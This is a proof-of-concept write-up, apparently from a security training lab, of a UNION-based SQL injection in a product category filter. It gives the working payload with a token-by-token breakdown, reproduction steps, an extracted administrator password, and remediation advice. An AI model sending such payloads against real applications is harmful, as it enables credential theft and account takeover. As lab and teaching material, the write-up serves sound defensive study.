## Title
SQL Injection (UNION-based) — Retrieving Multiple Values in a Single Column
## Severity
Critical (9.8)
## Summary
This PoC demonstrates a SQL injection flaw in the product category filter. By using Burp Suite to inject the payload '+UNION+SELECT+NULL,username||'~'||password+FROM+users-- into the category parameter, we can pull both the usernames and passwords from the users table into a single column and gain admin access.
## Affected Endpoint
```sql
GET /filter?category=<input>
```
## Root Cause
```sql
SELECT * FROM products WHERE category = '<user_input>'
```
## Payload
```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
## Payload Breakdown

- `+` (Plus Sign):Represent the space in URL.
- `'` (Single Quote): Closes the original backend SQL query string.
- `UNION SELECT`: Original query output combine with our malicious query.
- `NULL`:Placeholder for the first column — kept `NULL` because it isn't needed in the output.
- `username||'~'||password`:String Concatenation this query means combine username~password in one column
- `||`:this Operator used in `PostgreSQL` , `Oracle` and `SQLite`
- `FROM users`:Fetch the data in users database.
- `--`:comments out the rest of the original query so it doesn't cause a syntax error.

## Steps to Reproduce

1. Confirm the query that return 2 columns only one contain text  (established via `+UNION+SELECT+NULL,'abc'--`).
2. Modify the category parameter to `+UNION+SELECT+NULL,username||'~'||password+FROM+users--`.
3. Observe the response -- it lists `wiener` , `carlos` and `administrator`.
4. Since `username||'~'||password` combines both values with a `~` separator in one column, split the output at ~ to get the password (e.g., `administrator~8g6v8j6zu96ag0bn2d3g` → `username`: administrator, `password`: 8g6v8j6zu96ag0bn2d3g).
5. Confirm successful login as `administrator`.


## Evidence
<img width="1920" height="1200" alt="Pasted image 20260915061447" src="https://github.com/user-attachments/assets/aafb8cd4-5ec9-4d76-881c-f824987553c6" />
<img width="1920" height="1200" alt="Pasted image 20260915061409" src="https://github.com/user-attachments/assets/c09875bb-9886-4aa3-bdff-088fc2ccde21" />

## Impact

An attacker can extract the entire username~password column, retrieve the administrator's credentials, and log in with full account access.
## Remediation

- Use parameterized queries (prepared statements). Do not add user input directly into SQL queries.
- Apply the principle of least privilege to the database account used by the application.
- Show a generic error message instead of a detailed database error.
